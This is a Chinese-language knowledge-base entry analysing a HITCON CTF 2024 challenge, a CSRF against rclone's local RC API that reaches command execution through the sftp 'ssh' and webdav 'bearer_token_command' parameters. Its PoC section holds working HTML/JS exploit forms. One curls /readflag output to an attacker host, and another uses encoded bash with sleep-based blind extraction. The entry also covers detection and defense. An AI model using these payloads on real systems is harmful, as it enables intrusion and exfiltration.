---
id: web-generic-csrf-rclone-rc-config-create-command-exec
title: CSRF 打本机 rclone RC API：config/create 的 sftp ssh / webdav bearer_token_command 执行命令，配合 sleep 时间盲注外带
type: scenario
domain: web
path: web/generic/csrf
technique: csrf-rclone-rc-config-create-command-exec
aliases:
- rclone RC API CSRF
- rclone config/create RCE
- sftp ssh 参数命令执行
- webdav bearer_token_command
- Admin Bot for RClonE
- 时间盲注外带 flag
- target=_blank 表单 CSRF
tags:
- web
- csrf
- rclone
- ssrf
- command-injection
- localhost
- timing-oracle
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V283
  verified_at: '2026-11-08T04:53:49+08:00'
  notes: 已对照原文与全部 3 张图核对：HITCON CTF2024 RClonE，bot 先登录 LOGIN_URL 再访问攻击 URL；攻击页以 config/create(type=sftp, parameters.ssh=bash -c curl .../readflag) + operations/list 触发命令，另有 webdav bearer_token_command + base64 命令体 + sleep 5 二分盲注；payload 与原文逐字一致。dup-scan 与 pentest-ad-ntlm-relay-portbender-chisel-dc-domain-admin 的 pair 为 related（机制完全不同，均保留）。未在本环境搭建 rclone RC 复跑；原文未声明受影响版本区间，未设置 versions。
---

## 一句话结论

rclone 的 Web UI/RC API（默认 `127.0.0.1:5572`）没有 CSRF 防护，攻击者页面可让管理员 bot 的浏览器自动向本机 RC API 提交表单：`POST /config/create` 创建一个 `sftp` 远程并把 `parameters.ssh` 设为任意 shell 命令（或创建 `webdav` 远程把 `bearer_token_command` 设为命令），再 `POST /operations/list` 触发连接，命令即以 rclone 进程权限执行；目标不出网时可用 `sleep` 时间差做盲注，逐字符外带 flag。

## 原理

- **rclone RC API 的信任边界**：rclone 的 Web UI 与 RC API 默认监听本机（示例 `rclone:5572`），设计上依赖“只有本机能访问”作为安全边界，通常没有登录/CSRF token，也不校验 `Origin`；浏览器中的任意页面都可以向 `http://127.0.0.1:5572`/`http://rclone:5572` 提交 simple form（跨站表单不受 CORS 读响应限制，`target=_blank` 即可）。
- **config/create 的命令入口**：
  - `type=sftp` 时，`parameters.ssh` 是 rclone 建立 SFTP 连接时执行的 ssh 命令字符串（如 `ssh -o ...`），攻击者传入 `bash -c "..."` 即可执行任意命令；
  - `type=webdav` 时，`parameters.bearer_token_command` 是 rclone 获取 bearer token 时执行的命令，同样可控。
  - RC API 用 `json.Unmarshal` 解析 `parameters` 字段，表单里直接放 JSON 字符串即可。
- **触发**：仅创建 remote 不会执行 ssh/token 命令，需要再调用 `POST /operations/list`（`fs=yy:` / `u:`）让 rclone 实际连接该 remote；连接时执行 ssh/`bearer_token_command`。
- **为什么能打到**：Admin Bot 先登录 rclone Web UI，再访问攻击者 URL；攻击者页面用两个自动提交的表单（`config/create` → 延迟 → `operations/list`）驱动本机 RC API，整个链不需要读取 RC 响应，也不需要知道任何 token。
- **不出网时的外带**：第二个 WP 用 `webdav` 的 `bearer_token_command` 执行 `bash -c {echo,<base64>}|{base64,-d}|{bash,-i}`，命令体为 `[[ $(/readflag|base64) > <prefix><char>* ]] && sleep 5`；bot 页面按 base64 字符集二分，若请求耗时 >4 秒说明前缀匹配，逐字符还原 flag，无需目标外联。
- **边界**：需要 bot/管理员浏览器能访问 rclone RC 端口（本机或内网主机名），rclone 未启用 RC 认证（`--rc-user/--rc-pass`）且未限制 `config/create`；真实环境中 RC API 通常绑定 127.0.0.1，只有本机浏览器/SSRF 才能到达。

## 触发条件

- rclone Web UI/RC API 在 bot 可达的地址上（如 `http://rclone:5572` 或 `127.0.0.1:5572`），未启用认证/CSRF 防护。
- 管理员 bot 会先登录 rclone Web UI，再访问攻击者可控 URL（CTF 的 Admin Bot 模式，或社工管理员打开恶意页）。
- rclone 版本支持 `config/create` 的 `parameters` JSON，且 sftp/webdav 后端允许 `ssh`/`bearer_token_command`。
- 目标允许创建 remote 并执行 `operations/list`；若要时间盲注，响应时间可观测且网络稳定。

## 利用步骤

1. 确认 bot 会访问外部 URL，且 rclone RC 端口可达（先用 webhook 测试 bot 请求）。
2. 构造恶意 HTML：表单 1 `action=http://rclone:5572/config/create`，字段 `name`、`type=sftp`、`parameters`（JS 填入 JSON，含 `ssh` 命令）；表单 2 `action=http://rclone:5572/operations/list`，字段 `fs=<name>:`、`remote=`。
3. 页面加载后 `cfgform.submit()`，`setTimeout(1500)` 后 `listform.submit()`；用 `<img src=/delay.php?seconds=5>` 或等待确保页面停留。
4. `ssh` 命令中把 `/readflag` 结果通过 `curl http://attacker/submit -d url=...$(/readflag)` 外带；若目标不出网，改用 `bearer_token_command` + `sleep` 条件做时间盲注。
5. 收到外带数据/还原 flag；清理创建的 remote（可选，RC API `config/delete`）。

## PoC

文章第一个 WP（sftp + ssh 命令）：

```html
<form action="http://192.168.174.128:5572/config/create" method="POST" id="cfgform" target="_blank">
    <input name="name" value="yy" />
    <input name="type" value="sftp" />
    <input name="parameters" />
    <button type="submit">Create</button>
</form>
<script>
    cfgform.parameters.value = JSON.stringify({
        ssh: `bash -c "curl http://192.168.174.128:8080/submit -d url=http://${location.host}/flag?flag=$(/readflag)"`
    })
</script>

<form action="http://192.168.174.128:5572/operations/list" method="POST" id="listform" target="_blank">
    <input name="fs" value="yy:" />
    <input name="remote" value="" />
    <button type="submit">Do List</button>
</form>
<script>
    cfgform.submit()
    setTimeout(() => { listform.submit() }, 1500)
</script>
<img src="/delay.php?seconds=5" />
```

第二个 WP（webdav bearer_token_command + sleep 时间盲注，节选）：

```javascript
// exp1: 创建 webdav remote，bearer_token_command 执行命令
const exp1 = `
<form id="rce" method="post" action="http://rclone:5572/config/create">
    <input name="name" value="u">
    <input name="type" value="webdav">
    <input name="parameters" value='{{"bearer_token_command":"{}", "url":"http://bot:8000"}}'>
</form>
<script>rce.submit();</script>`;

// exp2: 触发 operations/list，测量响应时间
const exp2 = `
<form id="form" method="post" action="http://rclone:5572/operations/list">
    <input type="hidden" name="fs" value="u:" />
    <input type="hidden" name="remote" value="" />
</form>
<script>form.submit();</script>`;

// 命令体：[[ $(/readflag|base64) > <prefix><char>* ]] && sleep 5
// payload = base64("..."); bash -c {echo,<payload>}|{base64,-d}|{bash,-i}
```

说明：文章为 HITCON CTF 2024 `RClonE` 复现，`192.168.174.128`/`rclone` 为题目环境地址；未在本环境执行。

## 变体与关联

- **rclone 后端命令入口**：sftp 的 `ssh`、webdav 的 `bearer_token_command`；其他后端若支持自定义命令/脚本，也可能成为 sink。
- **触发方式**：表单 `target=_blank` 规避 CORS 读响应；也可用 `fetch(...,{mode:'no-cors'})`（simple request）或 iframe。
- **盲外带**：`sleep` 时间差、错误页差异、DNS/HTTP 带外；二分 base64 字符集是稳定做法。
- **同类本地服务 CSRF**：Docker/Portainer、Grafana、Jupyter 等本地管理端口；见 [[web-generic-csrf-zrlog-admin-json-api-text-plain-all-endpoints]]（一般 CSRF 原理）。
- **rclone 命令注入**：[[web-nodejs-dokploy-destination-testconnection-rclone-command-injection]]（应用把输入拼进 rclone 命令，非 CSRF/RC API）。

## 检测与防御

- **rclone 侧**：RC/Web UI 不要暴露给浏览器可访问的地址；启用 `--rc-user/--rc-pass`、绑定 127.0.0.1、加 token；禁用不必要的 `config/create`/`operations/list`（`--rc-no-auth` 的反面）。
- **浏览器/管理侧**：管理 bot 不应在同一浏览器上下文中先登录敏感服务再访问外部 URL；限制跨站表单/Origin。
- **检测**：rclone 日志出现 `config/create` 创建 sftp/webdav remote、随后 `operations/list`；`parameters` 含 `ssh`/`bearer_token_command` 与 `bash -c`、`curl`、`sleep` 等；异常外连或固定 5 秒响应。
- **加固**：最小化 RC API 暴露面，使用网络隔离；对 rclone 配置目录与 remote 创建做审计。
